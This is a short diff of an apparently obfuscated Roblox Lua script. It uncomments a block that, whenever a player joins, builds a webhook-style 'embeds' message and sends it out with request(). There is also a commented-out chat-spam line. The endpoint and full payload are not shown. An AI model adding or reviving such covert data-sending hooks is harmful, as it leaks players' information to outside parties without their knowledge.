@@ -1,4 +1,4 @@
---[[pcall(function()
+pcall(function()
    game.Players.PlayerAdded:Connect(function(v)
             local dataa = {
     ["embeds"] = {{
@@ -69,7 +69,7 @@ request(
 end)
 end
    --game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('xm96x is cool', "All")
-end)]]
+end)
 
 ([[
                      		   This script was obfuscated using ActualShitFuscator.
